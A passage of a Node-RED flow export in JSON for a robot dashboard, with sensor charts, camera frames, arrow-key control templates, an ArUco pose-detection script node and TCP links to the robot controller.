        "type": "ui_button",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "group": "5fa1e3b2c9358c39",
        "order": 4,
        "width": 3,
        "height": 1,
        "passthru": false,
        "label": "clear",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "[]",
        "payloadType": "json",
        "topic": "set",
        "topicType": "str",
        "x": 910,
        "y": 1180,
        "wires": [
            [
                "b69c5129af8f7ec1"
            ]
        ]
    },
    {
        "id": "35c0629717713a22",
        "type": "ui_button",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "group": "5fa1e3b2c9358c39",
        "order": 2,
        "width": 3,
        "height": 1,
        "passthru": false,
        "label": "set data",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "[{\"x\":10,\"y\":11},{\"x\":11,\"y\":12},{\"x\":13,\"y\":12},{\"x\":15,\"y\":12},{\"x\":18,\"y\":16},{\"x\":20,\"y\":22},{\"x\":20,\"y\":22},{\"x\":21,\"y\":22},{\"x\":24,\"y\":22},{\"x\":26,\"y\":25},{\"x\":28,\"y\":30},{\"x\":30,\"y\":40},{\"x\":30,\"y\":30},{\"x\":30,\"y\":40},{\"x\":31,\"y\":40},{\"x\":31,\"y\":51},{\"x\":31,\"y\":42},{\"x\":34,\"y\":30},{\"x\":37,\"y\":30},{\"x\":40,\"y\":82},{\"x\":40,\"y\":80},{\"x\":40,\"y\":90},{\"x\":42,\"y\":83},{\"x\":44,\"y\":93},{\"x\":45,\"y\":63},{\"x\":45,\"y\":99},{\"x\":46,\"y\":42},{\"x\":48,\"y\":82}]",
        "payloadType": "json",
        "topic": "set",
        "topicType": "str",
        "x": 920,
        "y": 1060,
        "wires": [
            [
                "b69c5129af8f7ec1"
            ]
        ]
    },
    {
        "id": "972a2419c4c3a8c2",
        "type": "ui_slider",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "label": "slider",
        "tooltip": "",
        "group": "a348b0ef9d248038",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": true,
        "outs": "end",
        "topic": "",
        "topicType": "str",
        "min": "16",
        "max": "25",
        "step": ".5",
        "className": "",
        "x": 590,
        "y": 1100,
        "wires": [
            [
                "76babcd89346ed12"
            ]
        ]
    },
    {
        "id": "38ad8ad9799375a3",
        "type": "ui_slider",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "label": "slider",
        "tooltip": "",
        "group": "a348b0ef9d248038",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": false,
        "outs": "all",
        "topic": "topic",
        "topicType": "msg",
        "min": "16",
        "max": "24",
        "step": "0.5",
        "className": "",
        "x": 330,
        "y": 1200,
        "wires": [
            [
                "7c5e3c8df1fbd991"
            ]
        ]
    },
    {
        "id": "9523713e522a5b9b",
        "type": "ui_colour_picker",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "label": "",
        "group": "c86f4eb8832ef5e9",
        "format": "rgb",
        "outformat": "object",
        "showSwatch": true,
        "showPicker": false,
        "showValue": false,
        "showHue": false,
        "showAlpha": false,
        "showLightness": true,
        "square": "false",
        "dynOutput": "false",
        "order": 6,
        "width": 1,
        "height": 1,
        "passthru": true,
        "topic": "topic",
        "topicType": "msg",
        "className": "",
        "x": 150,
        "y": 560,
        "wires": [
            [
                "b3b607fcfaf621bc"
            ]
        ]
    },
    {
        "id": "8edd6f1df01a8dd1",
        "type": "ui_colour_picker",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "label": "",
        "group": "c86f4eb8832ef5e9",
        "format": "rgb",
        "outformat": "object",
        "showSwatch": true,
        "showPicker": false,
        "showValue": false,
        "showHue": false,
        "showAlpha": false,
        "showLightness": true,
        "square": "false",
        "dynOutput": "false",
        "order": 9,
        "width": 1,
        "height": 1,
        "passthru": true,
        "topic": "topic",
        "topicType": "msg",
        "className": "",
        "x": 150,
        "y": 640,
        "wires": [
            [
                "a9c34ec6023fa193"
            ]
        ]
    },
    {
        "id": "fd1b46ad8a3386fc",
        "type": "ui_text",
        "z": "5c3cf3d89dd2afb1",
        "group": "08d388c7e26378d4",
        "order": 5,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Front Cliff Sensors:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 1030,
        "y": 680,
        "wires": []
    },
    {
        "id": "297a67f57d5ce5a4",
        "type": "ui_text",
        "z": "5c3cf3d89dd2afb1",
        "group": "08d388c7e26378d4",
        "order": 9,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Rear Cliff  Sensors:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 1030,
        "y": 720,
        "wires": []
    },
    {
        "id": "fb66575a3f82b753",
        "type": "ui_text",
        "z": "5c3cf3d89dd2afb1",
        "group": "08d388c7e26378d4",
        "order": 1,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Bumpers:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 1000,
        "y": 640,
        "wires": []
    },
    {
        "id": "b40c76a7d0035bb3",
        "type": "ui_text",
        "z": "5c3cf3d89dd2afb1",
        "group": "c86f4eb8832ef5e9",
        "order": 5,
        "width": 2,
        "height": 1,
        "name": "",
        "label": "RGB-L",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": "",
        "color": "#000000",
        "x": 130,
        "y": 520,
        "wires": []
    },
    {
        "id": "881cdde3d4413e24",
        "type": "ui_text",
        "z": "5c3cf3d89dd2afb1",
        "group": "c86f4eb8832ef5e9",
        "order": 8,
        "width": 2,
        "height": 1,
        "name": "",
        "label": "RGB-R",
        "format": "{{msg.payload}}",
        "layout": "row-right",
        "className": "",
        "x": 140,
        "y": 600,
        "wires": []
    },
    {
        "id": "6acab2e55f32d317",
        "type": "ui_text",
        "z": "5c3cf3d89dd2afb1",
        "group": "c86f4eb8832ef5e9",
        "order": 10,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Speed: ",
        "format": "{{msg.payload.dir[1]}}",
        "layout": "col-center",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": "",
        "color": "#000000",
        "x": 440,
        "y": 480,
        "wires": []
    },
    {
        "id": "c63c8abcdc5b833d",
        "type": "ui_text",
        "z": "5c3cf3d89dd2afb1",
        "group": "c86f4eb8832ef5e9",
        "order": 11,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Direction: ",
        "format": "{{msg.payload.dir[0]}}",
        "layout": "col-center",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": "",
        "color": "#000000",
        "x": 440,
        "y": 520,
        "wires": []
    },
    {
        "id": "6036bf1b5010c492",
        "type": "ui_text",
        "z": "5c3cf3d89dd2afb1",
        "group": "c86f4eb8832ef5e9",
        "order": 12,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Left Encoder",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 830,
        "y": 960,
        "wires": []
    },
    {
        "id": "e4d0bc2c7fd2e40d",
        "type": "ui_text",
        "z": "5c3cf3d89dd2afb1",
        "group": "c86f4eb8832ef5e9",
        "order": 13,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Right Encoder",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1000,
        "y": 960,
        "wires": []
    },
    {
        "id": "76babcd89346ed12",
        "type": "ui_gauge",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "group": "a348b0ef9d248038",
        "order": 3,
        "width": 0,
        "height": 0,
        "gtype": "gage",
        "title": "gauge",
        "label": "units",
        "format": "{{value}}",
        "min": "16",
        "max": "25",
        "colors": [
            "#000080",
            "#000080",
            "#000080"
        ],
        "seg1": "",
        "seg2": "",
        "className": "",
        "x": 730,
        "y": 1100,
        "wires": []
    },
    {
        "id": "0e4762c089b17f6d",
        "type": "ui_chart",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "group": "08d388c7e26378d4",
        "order": 13,
        "width": 6,
        "height": 3,
        "label": "Cliff Sensors",
        "chartType": "bar",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "No Data",
        "dot": false,
        "ymin": "0",
        "ymax": "100",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 720,
        "wires": [
            []
        ]
    },
    {
        "id": "dc27ce218486add2",
        "type": "ui_chart",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "group": "08d388c7e26378d4",
        "order": 16,
        "width": 6,
        "height": 4,
        "label": "Currents",
        "chartType": "horizontalBar",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "0",
        "ymax": "1",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": "30",
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 820,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "1a7f4269b81e56a1",
        "type": "ui_chart",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "group": "08d388c7e26378d4",
        "order": 14,
        "width": 6,
        "height": 3,
        "label": "Dist. Sensors",
        "chartType": "bar",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "No Data",
        "dot": false,
        "ymin": "0",
        "ymax": "4",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 880,
        "wires": [
            []
        ]
    },
    {
        "id": "64d36d03c726fc51",
        "type": "ui_chart",
        "z": "5c3cf3d89dd2afb1",
        "name": "",
        "group": "08d388c7e26378d4",
        "order": 15,
        "width": 6,
        "height": 3,
        "label": "Voltages",
        "chartType": "horizontalBar",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "5",
        "ymax": "10",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": "30",
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 820,
        "y": 640,
        "wires": [
            []
        ]
    },
    {
        "id": "f5ecf4f459338647",
        "type": "ui_template",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "group": "c86f4eb8832ef5e9",
        "name": "Camera frame external",
        "order": 1,
        "width": 0,
        "height": 0,
        "format": "<div ng-bind-html=\"msg.payload\"></div>\n<iframe scrolling=no marginwidth=0 marginheight=0\nframeborder=0 height=420 width=522 src=\"http://178.222.142.70:81/html/min.php\"></iframe>\n<!-- frameborder=0 height=439 width=553 -->",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "local",
        "className": "",
        "x": 780,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "d65b91c9dd547fab",
        "type": "ui_template",
        "z": "5c3cf3d89dd2afb1",
        "group": "a348b0ef9d248038",
        "name": "Read keyboard",
        "order": 7,
        "width": 0,
        "height": 0,
        "format": "<div id=\"key_press\">waiting key</div>\n<script type=\"text/javascript\">\n(function(scope) {\n  const _scope = scope;\n  $('body').on(\"keyup\", function(e) { \n      var keyCode = (e || event || {}).keyCode;\n      if(keyCode >= 37 && keyCode <= 40) {\n        $(\"#key_press\").text(\"Detected: \" + keyCode);\n        _scope.send({payload: keyCode});\n      } \n  });\n})(scope);\n</script>",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "local",
        "className": "",
        "x": 160,
        "y": 1040,
        "wires": [
            [
                "96735c606d0b6648"
            ]
        ]
    },
    {
        "id": "06b5c9295231296d",
        "type": "ui_template",
        "z": "5c3cf3d89dd2afb1",
        "group": "a348b0ef9d248038",
        "name": "",
        "order": 1,
        "width": 0,
        "height": 0,
        "format": "<div id=\"key_press\">Press L/R Arrow Keys to adjust Slider</div>\n<script type=\"text/javascript\">\n(function(scope) {\n  const _scope = scope;\n  $('body').on(\"keydown\", function(e) { \n            var keyCode = (e || event || {}).keyCode;\n      if(keyCode === 37) {\n        _scope.send({key: \"left\"});\n      } else if(keyCode === 40) {\n        _scope.send({key: \"right\"});\n      }\n  });\n})(scope);\n</script>",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "local",
        "className": "",
        "x": 140,
        "y": 1100,
        "wires": [
            [
                "73251bf7bc549723"
            ]
        ]
    },
    {
        "id": "dcd7121bbde54423",
        "type": "ui_template",
        "z": "5c3cf3d89dd2afb1",
        "group": "a348b0ef9d248038",
        "name": "",
        "order": 7,
        "width": 0,
        "height": 0,
        "format": "<div id=\"key_press\">waiting key</div>\n<script type=\"text/javascript\">\n(function(scope) {\n  const _scope = scope;\n  $('body').on(\"keyup\", function(e) { \n      var keyCode = (e || event || {}).keyCode;\n      if(keyCode >= 37 && keyCode <= 40) {\n        $(\"#key_press\").text(\"Detected Key: \" + keyCode);\n        _scope.send({payload: keyCode});\n      } \n  });\n})(scope);\n</script>",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "local",
        "className": "",
        "x": 140,
        "y": 1160,
        "wires": [
            [
                "2b86f7480e2e9c1e"
            ]
        ]
    },
    {
        "id": "7c474f57448c7ac4",
        "type": "ui_template",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "group": "c86f4eb8832ef5e9",
        "name": "Camera frame local",
        "order": 2,
        "width": 0,
        "height": 0,
        "format": "<div ng-bind-html=\"msg.payload\"></div>\n<!-- <iframe scrolling=no marginwidth=0 marginheight=0 -->\n<!-- frameborder=0 height=480 width=640 src=\"http://192.168.1.5:1234\"></iframe> -->\n\n<!-- <video id=\"video\" src=\"http://192.168.1.5:1234\" autoplay=\"autoplay\" /> -->\n\n<video id=\"player\" class=\"video-js vjs-default-skin\" height=\"480\" width=\"640\" controls preload=\"none\">\n    <source src=\"http://192.168.1.5:1234\" type=\"application/x-mpegURL\" />\n</video>\n\n<!-- frameborder=0 height=439 width=553 -->\n<!-- frameborder=0 height=420 width=522 src=\"http://192.168.1.3:81/html/min.php\"></iframe> -->",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "local",
        "className": "",
        "x": 770,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "c06bb8a0c16fab29",
        "type": "ui_template",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "group": "dce9e7a2.d20c78",
        "name": "head script",
        "order": 9,
        "width": 0,
        "height": 0,
        "format": "<!-- <script type=\"text/javascript\" src=\"https://canvasjs.com/assets/script/canvasjs.min.js\"></script> -->\n<script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "global",
        "className": "",
        "x": 1070,
        "y": 1100,
        "wires": [
            []
        ]
    },
    {
        "id": "b69c5129af8f7ec1",
        "type": "ui_template",
        "z": "5c3cf3d89dd2afb1",
        "group": "5fa1e3b2c9358c39",
        "name": "scatter",
        "order": 1,
        "width": 6,
        "height": 6,
        "format": "<script>\n  (function(scope) {\n    const chartData = {\n      datasets: [{\n        label: 'Robot path',\n        data: [],\n        backgroundColor: 'rgb(255, 99, 132)'\n      }],\n    };\n\n    const config = {\n      type: 'line',\n//      type: 'scatter',\n      data: chartData,\n      options: {\n//        aspectRatio: 1,\n        maintainAspectRatio: false,\n        scales: {\n          x: {\n            type: 'linear',\n            position: 'bottom'\n          }\n        }\n      }\n    };\n\n    var myChart = new Chart(\n      document.getElementById('myChart'),\n      config\n    );\n\n    scope.$watch('msg', function(msg) {\n      if (msg) {\n        \n        if(msg.topic == \"add\") {\n          myChart.data.datasets[0].data.push(msg.payload);\n          myChart.update();\n        }        \n        if(msg.topic == \"set\") {\n          myChart.data.datasets[0].data = [...msg.payload];\n          myChart.update();\n        }\n      }\n    });\n  })(scope);\n</script>\n\n<div class=\"chart-container\" style=\"position: relative; height:100%; width:100%\">\n  <canvas id=\"myChart\"></canvas>\n</div>",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "local",
        "className": "",
        "x": 1090,
        "y": 1140,
        "wires": [
            []
        ]
    },
    {
        "id": "e61e674e874f42a6",
        "type": "serial in",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "serial": "d86c30358aabe2a6",
        "x": 140,
        "y": 800,
        "wires": [
            [
                "106cdfc9891c6541",
                "74b2b4b45add9f14"
            ]
        ]
    },
    {
        "id": "f3098638cfe5fbb1",
        "type": "serial out",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "serial": "d86c30358aabe2a6",
        "x": 540,
        "y": 1420,
        "wires": []
    },
    {
        "id": "f86a2c310997bbee",
        "type": "serial out",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "name": "",
        "serial": "d86c30358aabe2a6",
        "x": 580,
        "y": 560,
        "wires": []
    },
    {
        "id": "26b6c32a573fd3b6",
        "type": "ui_template",
        "z": "5c3cf3d89dd2afb1",
        "d": true,
        "group": "c86f4eb8832ef5e9",
        "name": "Camera frame local",
        "order": 3,
        "width": 0,
        "height": 0,
        "format": "<div ng-bind-html=\"msg.payload\"></div>\n<iframe scrolling=no marginwidth=0 marginheight=0\nframeborder=0 height=480 width=640 src=\"http://192.168.1.5:1234\"></iframe>\n<!-- frameborder=0 height=439 width=553 -->\n<!-- frameborder=0 height=420 width=522 src=\"http://192.168.1.3:81/html/min.php\"></iframe> -->",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "local",
        "className": "",
        "x": 770,
        "y": 480,
        "wires": [
            []
        ]
    },
    {
        "id": "8002e74f3e549164",
        "type": "ui_template",
        "z": "5c3cf3d89dd2afb1",
        "group": "c86f4eb8832ef5e9",
        "name": "Camera frame local",
        "order": 4,
        "width": 0,
        "height": 0,
        "format": "<video id=\"video\" autoplay=\"autoplay\" height=\"400px\" width=\"522px\" preload=\"none\">\n    <source src=\"http://192.168.1.6:1234\" />\n    Your browser doesn't appear to support the HTML5 <code>&lt;video&gt;</code> element.\n</video>\n\n<!--\n    <video id=\"video\" autoplay=\"autoplay\" height=\"480px\" width=\"640px\" preload=\"none\">\n    preload=\"metadata\"\n-->",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": true,
        "templateScope": "local",
        "className": "",
        "x": 770,
        "y": 560,
        "wires": [
            []
        ]
    },
    {
        "id": "5169142405acac1f",
        "type": "ui_slider",
        "z": "786f9546367d3e03",
        "name": "",
        "label": "Position X",
        "tooltip": "",
        "group": "0f3fbbc1566187b3",
        "order": 1,
        "width": "6",
        "height": "1",
        "passthru": true,
        "outs": "end",
        "topic": "position",
        "topicType": "str",
        "min": "-200",
        "max": "200",
        "step": "1",
        "className": "",
        "x": 560,
        "y": 220,
        "wires": [
            [
                "977b480b3cac9691"
            ]
        ]
    },
    {
        "id": "7a11c5719aa466a9",
        "type": "debug",
        "z": "786f9546367d3e03",
        "name": "debug 8",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 700,
        "y": 460,
        "wires": []
    },
    {
        "id": "6d717388d1ee017b",
        "type": "tcp out",
        "z": "786f9546367d3e03",
        "d": true,
        "name": "",
        "host": "10.10.0.100",
        "port": "100",
        "beserver": "client",
        "base64": false,
        "end": false,
        "tls": "",
        "x": 920,
        "y": 440,
        "wires": []
    },
    {
        "id": "bf39f7d599a5120e",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "if (flow.get(\"positionX\") == undefined) {\n    flow.set(\"positionX\", 0);\n}\nif (flow.get(\"positionY\") == undefined) {\n    flow.set(\"positionY\", 0);\n}\n\nvar m={\n    \"cmd\":\"move2\",\n    \"val\": [flow.get(\"positionX\"), flow.get(\"positionY\")],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 140,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "c72d1a494a6245b1",
        "type": "json",
        "z": "786f9546367d3e03",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 550,
        "y": 500,
        "wires": [
            [
                "7a11c5719aa466a9",
                "8fe71a74bc87dec0"
            ]
        ]
    },
    {
        "id": "9b1d766bee26d3d3",
        "type": "pythonshell in",
        "z": "786f9546367d3e03",
        "name": "",
        "pyfile": "/home/pi/opencv/aruco_pose_estimation_frame.py",
        "virtualenv": "",
        "continuous": true,
        "stdInData": false,
        "x": 400,
        "y": 660,
        "wires": [
            [
                "23f5cb94.03cb04",
                "65512f3d2c33c8c5"
            ]
        ]
    },
    {
        "id": "fa1abaf4.885038",
        "type": "template",
        "z": "786f9546367d3e03",
        "name": "Image in",
        "field": "payload",
        "fieldType": "msg",
        "format": "handlebars",
        "syntax": "mustache",
        "template": "<img src=\"data:image/png;base64,{{payload}}\" style=\"width=\"640\" height=\"480\"\"/>",
        "output": "str",
        "x": 580,
        "y": 780,
        "wires": [
            [
                "b42fd1dc.ba144"
            ]
        ]
    },
    {
        "id": "b42fd1dc.ba144",
        "type": "ui_template",
        "z": "786f9546367d3e03",
        "group": "92d96041952701fd",
        "name": "MV result",
        "order": 8,
        "width": "6",
        "height": "10",
        "format": "<div ng-bind-html=\"msg.payload\"></div>",
        "storeOutMessages": true,
        "fwdInMessages": true,
        "resendOnRefresh": false,
        "templateScope": "local",
        "className": "",
        "x": 740,
        "y": 780,
        "wires": [
            []
        ]
    },
    {
        "id": "23f5cb94.03cb04",
        "type": "file in",
        "z": "786f9546367d3e03",
        "name": "",
        "filename": "/home/pi/opencv/resultImage.jpg",
        "filenameType": "str",
        "format": "",
        "chunk": false,
        "sendError": false,
        "encoding": "none",
        "allProps": false,
        "x": 490,
        "y": 720,
        "wires": [
            [
                "b83253e6.36f6a"
            ]
        ]
    },
    {
        "id": "b83253e6.36f6a",
        "type": "base64",
        "z": "786f9546367d3e03",
        "name": "",
        "action": "",
        "property": "payload",
        "x": 420,
        "y": 780,
        "wires": [
            [
                "fa1abaf4.885038"
            ]
        ]
    },
    {
        "id": "11d4f5190f42ebbd",
        "type": "debug",
        "z": "786f9546367d3e03",
        "name": "debug 12",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 760,
        "y": 740,
        "wires": []
    },
    {
        "id": "a7cfad3fa308b2ea",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 5,
        "width": "3",
        "height": "1",
        "passthru": false,
        "label": "Run Detection",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "topic",
        "topicType": "msg",
        "x": 160,
        "y": 660,
        "wires": [
            [
                "9b1d766bee26d3d3",
                "6f0be04140994ed2"
            ]
        ]
    },
    {
        "id": "65512f3d2c33c8c5",
        "type": "json",
        "z": "786f9546367d3e03",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 570,
        "y": 660,
        "wires": [
            [
                "11d4f5190f42ebbd",
                "50f1e3a29a9e8ff6",
                "0e7f6fddb38b19ec",
                "eda32cd5e411cfa7",
                "0c3727f949949f03"
            ]
        ]
    },
    {
        "id": "14ac1decf7bf0d86",
        "type": "ui_text",
        "z": "786f9546367d3e03",
        "group": "0f3fbbc1566187b3",
        "order": 19,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Position X, Y:",
        "format": "{{msg.payload.result}}: {{msg.payload.positionX}}, {{msg.payload.positionY}}",
        "layout": "row-spread",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": 16,
        "color": "#000000",
        "x": 930,
        "y": 660,
        "wires": []
    },
    {
        "id": "24c8ac2f0e4eacea",
        "type": "play audio",
        "z": "786f9546367d3e03",
        "d": true,
        "name": "",
        "voice": "5",
        "x": 930,
        "y": 620,
        "wires": []
    },
    {
        "id": "50f1e3a29a9e8ff6",
        "type": "function",
        "z": "786f9546367d3e03",
        "d": true,
        "name": "",
        "func": "msg.payload = \"Detection \" + msg.payload.result + \".\"\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 760,
        "y": 620,
        "wires": [
            [
                "24c8ac2f0e4eacea"
            ]
        ]
    },
    {
        "id": "6f0be04140994ed2",
        "type": "function",
        "z": "786f9546367d3e03",
        "d": true,
        "name": "",
        "func": "msg.payload = \"Detecting marker.\"\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 360,
        "y": 620,
        "wires": [
            [
                "5c98021ed81222f3"
            ]
        ]
    },
    {
        "id": "5c98021ed81222f3",
        "type": "play audio",
        "z": "786f9546367d3e03",
        "d": true,
        "name": "",
        "voice": "5",
        "x": 530,
        "y": 620,
        "wires": []
    },
    {
        "id": "6e1cf05dd85a1334",
        "type": "tcp in",
        "z": "786f9546367d3e03",
        "d": true,
        "name": "",
        "server": "client",
        "host": "10.10.0.100",
        "port": "100",
        "datamode": "stream",
        "datatype": "buffer",
        "newline": "",
        "topic": "",
        "trim": false,
        "base64": false,
        "tls": "",
        "x": 910,
        "y": 400,
        "wires": [
            []
        ]
    },
    {
        "id": "f9fa84538e955d8d",
        "type": "debug",
        "z": "786f9546367d3e03",
        "name": "debug 13",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 280,
        "y": 1020,
        "wires": []
    },
    {
        "id": "d0b0c7f0091b8569",
        "type": "switch",
        "z": "786f9546367d3e03",
        "name": "Check cmd",
        "property": "payload.cmd",
        "propertyType": "msg",
        "rules": [
            {
                "t": "eq",
                "v": "homed",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "servoDriveData",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "endSwitchData",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "homingStateData",
                "vt": "str"
            },
            {
                "t": "eq",
                "v": "allData",
                "vt": "str"
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 5,
        "x": 290,
        "y": 940,
        "wires": [
            [
                "8ee46a54a8cb7660"
            ],
            [
                "a0948f150647a6c8"
            ],
            [
                "62b7b1fd3f9a227b"
            ],
            [
                "55cf3acce7c198d0"
            ],
            [
                "ac3a60836fe09eaf",
                "f12b13f198b31cce"
            ]
        ]
    },
    {
        "id": "a0948f150647a6c8",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "const value = [];\nfor (let i = 0; i < 3; i++) {\n    if (msg.payload.val[i] < 1) {\n        value[i] = false;\n    } else {\n        value[i] = true;\n    }\n}\nreturn [{payload:value[0]}, {payload:value[1]}, {payload:value[2]}];",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 460,
        "y": 860,
        "wires": [
            [
                "202ea0a2cb43b03a"
            ],
            [
                "5371ab883d61f101"
            ],
            [
                "a798fb0e66596f98"
            ]
        ]
    },
    {
        "id": "c086f953e604c078",
        "type": "json",
        "z": "786f9546367d3e03",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 130,
        "y": 940,
        "wires": [
            [
                "d0b0c7f0091b8569",
                "f9fa84538e955d8d"
            ]
        ]
    },
    {
        "id": "202ea0a2cb43b03a",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 21,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Drive X",
        "x": 680,
        "y": 860,
        "wires": []
    },
    {
        "id": "5371ab883d61f101",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 22,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
